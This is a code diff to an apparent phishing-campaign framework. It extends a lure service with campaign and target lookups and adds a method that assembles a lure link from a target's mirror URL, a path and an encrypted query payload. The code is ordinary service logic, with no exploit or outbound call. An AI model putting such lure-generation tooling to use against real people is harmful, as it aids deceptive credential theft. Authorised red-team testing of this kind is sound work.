@@ -1,16 +1,21 @@
-import { DIContainer, arrayIncludes } from '@famir/common'
+import { DIContainer, arrayIncludes, encrypt, randomName } from '@famir/common'
 import {
+  CAMPAIGN_REPOSITORY,
+  CampaignRepository,
   DatabaseError,
   DatabaseErrorCode,
   LURE_REPOSITORY,
   LureModel,
-  LureRepository
+  LureRepository,
+  TARGET_REPOSITORY,
+  TargetRepository
 } from '@famir/database'
 import { ReplServerError } from '@famir/repl-server'
 import {
   CreateLureData,
   DeleteLureData,
   ListLuresData,
+  MakeLureUrlData,
   ReadLureData,
   SwitchLureData
 } from './lure.js'
@@ -21,11 +26,20 @@ export class LureService {
   static inject(container: DIContainer) {
     container.registerSingleton<LureService>(
       LURE_SERVICE,
-      (c) => new LureService(c.resolve<LureRepository>(LURE_REPOSITORY))
+      (c) =>
+        new LureService(
+          c.resolve<CampaignRepository>(CAMPAIGN_REPOSITORY),
+          c.resolve<TargetRepository>(TARGET_REPOSITORY),
+          c.resolve<LureRepository>(LURE_REPOSITORY)
+        )
     )
   }
 
-  constructor(protected readonly lureRepository: LureRepository) {}
+  constructor(
+    protected readonly campaignRepository: CampaignRepository,
+    protected readonly targetRepository: TargetRepository,
+    protected readonly lureRepository: LureRepository
+  ) {}
 
   async create(data: CreateLureData): Promise<true> {
     try {
@@ -54,15 +68,15 @@ export class LureService {
   }
 
   async read(data: ReadLureData): Promise<LureModel> {
-    const model = await this.lureRepository.read(data.campaignId, data.lureId)
+    const lure = await this.lureRepository.read(data.campaignId, data.lureId)
 
-    if (!model) {
+    if (!lure) {
       throw new ReplServerError(`Lure not found`, {
         code: 'NOT_FOUND'
       })
     }
 
-    return model
+    return lure
   }
 
   async enable(data: SwitchLureData): Promise<true> {
@@ -131,14 +145,50 @@ export class LureService {
   }
 
   async list(data: ListLuresData): Promise<LureModel[]> {
-    const collection = await this.lureRepository.list(data.campaignId)
+    const lures = await this.lureRepository.list(data.campaignId)
 
-    if (!collection) {
+    if (!lures) {
       throw new ReplServerError(`Campaign not found`, {
         code: 'NOT_FOUND'
       })
     }
 
-    return collection
+    return lures
+  }
+
+  async makeUrl(data: MakeLureUrlData): Promise<string> {
+    const lure = await this.lureRepository.read(data.campaignId, data.lureId)
+
+    if (!lure) {
+      throw new ReplServerError(`Lure not found`, {
+        code: 'NOT_FOUND'
+      })
+    }
+
+    const campaign = await this.campaignRepository.readFull(data.campaignId)
+
+    if (!campaign) {
+      throw new ReplServerError(`Campaign not found`, {
+        code: 'NOT_FOUND'
+      })
+    }
+
+    const target = await this.targetRepository.readFull(data.campaignId, data.targetId)
+
+    if (!target) {
+      throw new ReplServerError(`Target not found`, {
+        code: 'NOT_FOUND'
+      })
+    }
+
+    const payload = encrypt(JSON.stringify(data.payload), campaign.cryptSecret)
+    return [
+      target.mirrorUrl,
+      lure.path,
+      '?',
+      randomName(),
+      '=',
+      encodeURIComponent(payload),
+    ].join('')
   }
 }
